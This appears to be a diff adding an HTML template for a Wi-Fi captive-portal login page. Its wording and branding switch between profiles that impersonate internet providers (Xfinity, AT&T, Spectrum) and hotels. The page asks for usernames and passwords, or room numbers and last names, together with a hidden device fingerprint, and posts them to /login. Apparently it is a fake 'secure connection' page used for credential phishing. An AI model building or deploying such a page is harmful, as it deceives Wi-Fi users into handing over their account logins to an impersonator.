@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>{{ profile.title }}</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <style>
+        :root {
+            --brand-color: {{ profile.color }};
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, {{ profile.color }} 0%, {{ profile.color }}dd 100%);
+        }
+        .submit-btn:hover {
+            box-shadow: 0 8px 20px {{ profile.color }}44;
+        }
+        .forgot-link, .terms a {
+            color: {{ profile.color }};
+        }
+        input:focus {
+            border-color: {{ profile.color }};
+            box-shadow: 0 0 0 3px {{ profile.color }}22;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="brand-icon">{{ profile.icon }}</div>
+            <h1>{{ profile.title }}</h1>
+            <p class="subtitle">{{ profile.subtitle }}</p>
+        </div>
+
+        <div class="provider-badge">
+            <span id="device-icon">📱</span>
+            <span>{{ profile.brand }} Secure Connection</span>
+        </div>
+
+        <form id="login-form" action="/login" method="POST">
+            <input type="hidden" id="fingerprint" name="fingerprint" value="">
+            <input type="hidden" id="profile_name" name="profile_name" value="{{ profile_name }}">
+
+            <div class="form-group">
+                <label for="username">
+                    {% if profile_name == 'hotel' %}
+                        Room Number
+                    {% elif profile_name in ['xfinity', 'att', 'spectrum'] %}
+                        Username / Email
+                    {% else %}
+                        Email or Phone
+                    {% endif %}
+                </label>
+                <input type="text" id="username" name="username" 
+                       placeholder="{% if profile_name == 'hotel' %}Enter room number{% else %}Enter your email{% endif %}" 
+                       required autocomplete="username">
+            </div>
+
+            <div class="form-group">
+                <label for="password">
+                    {% if profile_name == 'hotel' %}
+                        Last Name
+                    {% else %}
+                        Password
+                    {% endif %}
+                </label>
+                <input type="password" id="password" name="password" 
+                       placeholder="{% if profile_name == 'hotel' %}Enter last name{% else %}Enter password{% endif %}" 
+                       required autocomplete="current-password">
+            </div>
+
+            <div class="form-options">
+                <label class="checkbox-label">
+                    <input type="checkbox" checked> Stay connected
+                </label>
+                <a href="#" class="forgot-link">
+                    {% if profile_name == 'hotel' %}Need help?{% else %}Forgot password?{% endif %}
+                </a>
+            </div>
+
+            <button type="submit" class="submit-btn">
+                <span class="btn-text">Connect</span>
+                <span class="btn-loader" style="display:none;">Connecting...</span>
+            </button>
+        </form>
+
+        <div class="terms">
+            {{ profile.terms_text }}. <a href="#">Learn more</a>
+        </div>
+
+        <div class="footer">
+            <p>{{ profile.footer }}</p>
+            <p class="small">{{ profile.support_phone }} • 24/7 Support</p>
+        </div>
+    </div>
+
+    <script src="/static/portal.js"></script>
+</body>
+</html>
